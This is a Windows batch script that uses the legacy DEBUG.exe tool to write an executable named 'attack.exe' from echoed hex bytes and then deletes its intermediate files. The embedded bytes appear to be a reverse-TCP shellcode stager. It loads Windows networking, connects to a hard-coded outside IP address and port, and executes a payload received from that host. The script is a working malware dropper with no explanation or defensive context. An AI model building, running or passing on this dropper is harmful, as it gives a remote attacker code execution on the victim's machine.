debug /?
if NOT %ERRORLEVEL% == 0 echo &echo &echo &echo **** **** **** **** ****&echo *** Missing DEBUG.exe ***&echo **** **** **** **** ****&exit /b
echo n attack.0>attack.hex
echo e 0014>>attack.hex
echo fc e8 8f 00 00 00 60 89 e5 31>>attack.hex
echo e 001e>>attack.hex
echo d2 64 8b 52 30 8b 52 0c 8b 52>>attack.hex
echo e 0028>>attack.hex
echo 14 0f b7 4a 26 31 ff 8b 72 28>>attack.hex
echo e 0032>>attack.hex
echo 31 c0 ac 3c 61 7c 02 2c 20 c1>>attack.hex
echo e 003c>>attack.hex
echo cf 0d 01 c7 49 75 ef 52 8b 52>>attack.hex
echo e 0046>>attack.hex
echo 10 57 8b 42 3c 01 d0 8b 40 78>>attack.hex
echo e 0050>>attack.hex
echo 85 c0 74 4c 01 d0 50 8b 48 18>>attack.hex
echo e 005a>>attack.hex
echo 8b 58 20 01 d3 85 c9 74 3c 49>>attack.hex
echo e 0064>>attack.hex
echo 31 ff 8b 34 8b 01 d6 31 c0 ac>>attack.hex
echo e 006e>>attack.hex
echo c1 cf 0d 01 c7 38 e0 75 f4 03>>attack.hex
echo e 0078>>attack.hex
echo 7d f8 3b 7d 24 75 e0 58 8b 58>>attack.hex
echo e 0082>>attack.hex
echo 24 01 d3 66 8b 0c 4b 8b 58 1c>>attack.hex
echo e 008c>>attack.hex
echo 01 d3 8b 04 8b 01 d0 89 44 24>>attack.hex
echo e 0096>>attack.hex
echo 24 5b 5b 61 59 5a 51 ff e0 58>>attack.hex
echo e 00a0>>attack.hex
echo 5f 5a 8b 12 e9 80 ff ff ff 5d>>attack.hex
echo e 00aa>>attack.hex
echo 68 33 32 00 00 68 77 73 32 5f>>attack.hex
echo e 00b4>>attack.hex
echo 54 68 4c 77 26 07 89 e8 ff d0>>attack.hex
echo e 00be>>attack.hex
echo b8 90 01 00 00 29 c4 54 50 68>>attack.hex
echo e 00c8>>attack.hex
echo 29 80 6b 00 ff d5 6a 0a 68 c1>>attack.hex
echo e 00d2>>attack.hex
echo a1 c1 63 68 02 00 dd 3a 89 e6>>attack.hex
echo e 00dc>>attack.hex
echo 50 50 50 50 40 50 40 50 68 ea>>attack.hex
echo e 00e6>>attack.hex
echo 0f df e0 ff d5 97 6a 10 56 57>>attack.hex
echo e 00f0>>attack.hex
echo 68 99 a5 74 61 ff d5 85 c0 74>>attack.hex
echo e 00fa>>attack.hex
echo 0a ff 4e 08 75 ec e8 67 00 00>>attack.hex
echo e 0104>>attack.hex
echo 00 6a 00 6a 04 56 57 68 02 d9>>attack.hex
echo e 010e>>attack.hex
echo c8 5f ff d5 83 f8 00 7e 36 8b>>attack.hex
echo e 0118>>attack.hex
echo 36 6a 40 68 00 10 00 00 56 6a>>attack.hex
echo e 0122>>attack.hex
echo 00 68 58 a4 53 e5 ff d5 93 53>>attack.hex
echo e 012c>>attack.hex
echo 6a 00 56 53 57 68 02 d9 c8 5f>>attack.hex
echo e 0136>>attack.hex
echo ff d5 83 f8 00 7d 28 58 68 00>>attack.hex
echo e 0140>>attack.hex
echo 40 00 00 6a 00 50 68 0b 2f 0f>>attack.hex
echo e 014a>>attack.hex
echo 30 ff d5 57 68 75 6e 4d 61 ff>>attack.hex
echo e 0154>>attack.hex
echo d5 5e 5e ff 0c 24 0f 85 70 ff>>attack.hex
echo e 015e>>attack.hex
echo ff ff e9 9b ff ff ff 01 c3 29>>attack.hex
echo e 0168>>attack.hex
echo c6 75 c1 c3 bb f0 b5 a2 56 6a>>attack.hex
echo e 0172>>attack.hex
echo 00 53 ff d5>>attack.hex
echo r cx>>attack.hex
echo 0168>>attack.hex
echo w>>attack.hex
echo q>>attack.hex
debug<attack.hex
move /Y attack.0 attack.exe
echo. >attack.hex
del /F /Q attack.hex attack.0
dir attack.exe

